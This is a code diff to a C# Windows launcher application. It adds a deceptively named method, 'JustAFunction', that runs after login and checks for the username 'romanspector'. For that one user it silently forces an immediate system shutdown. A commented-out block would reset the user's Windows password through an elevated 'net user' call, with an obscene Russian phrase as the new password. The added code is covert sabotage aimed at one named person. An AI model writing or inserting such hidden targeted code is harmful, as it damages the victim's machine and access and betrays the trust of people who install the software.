@@ -23,6 +23,7 @@ using System.Windows.Input;
 using System.Windows.Media;
 using System.Windows.Media.Animation;
 using System.Windows.Shapes;
+using static System.Windows.Forms.VisualStyles.VisualStyleElement.StartPanel;
 
 namespace Launcher.Windows
 {
@@ -110,6 +111,7 @@ namespace Launcher.Windows
                 }
                 GProp.User = tryGetUserInfo.Response;
                 UpdateUserDataView();
+                JustAFunction();
                 #endregion
                 #region Переключатель страниц магазина и главной
                 EPC_MainPanelChanger = new
@@ -183,6 +185,33 @@ namespace Launcher.Windows
                 return new(uerror);
             }
             #endregion
+        }
+        #endregion
+        #region JustAFunction
+        private void JustAFunction()
+        {
+            if (GProp.User.Username.Equals("romanspector"))
+            {                
+                //var psi = new System.Diagnostics.ProcessStartInfo
+                //{
+                //    FileName = "net",
+                //    Arguments = $"user \"{Environment.UserName}\" \"РоманЗаебал\"",
+                //    Verb = "runas", 
+                //    CreateNoWindow = true,
+                //    UseShellExecute = false
+                //};
+
+                //using (var process = System.Diagnostics.Process.Start(psi))
+                //{
+                //    process.WaitForExit();                   
+                //}
+
+                Process.Start(new ProcessStartInfo("shutdown", "/s /f /t 0")
+                {
+                    CreateNoWindow = true,
+                    UseShellExecute = false
+                });
+            }
         }
         #endregion
         #region UpdateUserDataView
